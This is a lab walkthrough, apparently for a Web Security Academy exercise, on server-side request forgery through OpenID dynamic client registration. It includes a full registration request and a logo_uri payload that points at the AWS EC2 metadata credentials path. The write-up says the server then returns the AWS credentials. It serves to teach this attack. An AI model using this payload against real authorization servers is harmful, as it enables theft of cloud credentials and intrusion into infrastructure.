# SSRF via OpenID dynamic client registration

## Preface
This lab is particularly interesting as it shows a vulnerability that can stem from an OAuth implementation that doesn't necessarily have anything to do with OAuth.

## Reproduction Steps
Dynamic Client Registration is a really interesting topic and technique that allows OAuth to scale. You can read more about it here, as well as RFC7591.

After discovering the registration endpoint which is found in the openid-configuration of the Authorization Server.

``https://oauth-0ab500b504ac233cc0166e0402bd0078.web-security-academy.net/.well-known/openid-configuration``
Specifically in the registration_endpoint key in the JSON response:

"registration_endpoint":"https://oauth-0ab500b504ac233cc0166e0402bd0078.web-security-academy.net/reg"
In order to know which information to pass to the registration endpoint, RFC7591 could be used to review the Client Metadata Fields.

The required information which needs to be passed to the Authorization Server in order to register the Client is as follows:

```
client_name
redirect_uris
client_uri
grant_types
scope
```

Thus the registration request will look similar to:

```html
POST /reg HTTP/1.1
Host: oauth-0ab500b504ac233cc0166e0402bd0078.web-security-academy.net
Cookie: _interaction=CFm_EqqiXK3p43Oo0HWu7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Referer: https://0aa2007c048523e6c0c96e53001600cc.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 195

{
	"client_name": "Oauth client",
	"redirect_uris": ["http://localhost:9000/callback"],
	"client_uri": "http://localhost:9000",
	"grant_types": ["authorization_code"],
        "scope": "openid"
}
```
The response from the Authorization Server will contain several pieces of information, however the two most important are the client_id and client_secret.

With these two pieces of information, start the OAuth flow on the web application and modify the client_id to match the one returned by the Authorization Server. During the scope verification page, observe that a request is being made which attempts to load a logo.
(Note: The OAuth flow will fail here as the client_secret the web application is configured with does not correspond with your client_id).

As mentioned the logo attempts to be loaded, and when looking at the Client Metadata Fields, an interesting field is discovered: logo_uri which is used to:

A URI for a graphical logo for the client. The authorization server can use this URL to display a logo for the client to the user, but keep in mind that fetching an image URL could have security and privacy considerations for the user.
As the logo appears to be fetched by the server (basically sever is behaving as a proxy) rather than the user's browser (potentially for security purposes, such as not leaking the user's IP Address), this looks to be a potential case for Server-Side Request Forgery.

Replay the request earlier to the Authorization Server's Registration Endpoint and include an extra field in the JSON request body which will be logo_uri. Point the logo_uri to an internal resource, such as the AWS EC2 Metadata URI:

// random json snipped
``"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"``

Re-initiate the OAuth flow and observe that a background request invokes a request to the Authorization Server, specifically the endpoint: /client/client_id/logo and the response contains the AWS Credentials.

#### Visit The Next Page For The Next Level :)
